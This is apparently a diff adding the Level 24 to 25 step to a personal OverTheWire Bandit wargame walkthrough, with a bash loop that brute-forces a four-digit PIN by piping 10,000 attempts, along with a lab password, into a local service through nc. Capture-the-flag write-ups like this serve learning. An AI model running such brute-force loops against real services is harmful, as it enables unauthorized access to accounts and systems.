@@ -556,3 +556,23 @@ cat password
 exit
 ssh bandit24@bandit.labs.overthewire.org -p 2220
 ```
+
+### Level 24 >> Level 25
+
+```bash
+mkdit /tmp/mrp4sten
+cd /tmp/mrp4sten
+touch script.sh
+chmod +x script.sh
+vim script.sh
+
+# content from the script
+#!/bin/bash
+for i in {0000..9999}; do
+ echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
+done
+
+./script.sh | nc localhost 30002 > result.txt
+sort result.txt | grep -v -E "Wrong|Please"
+
+```
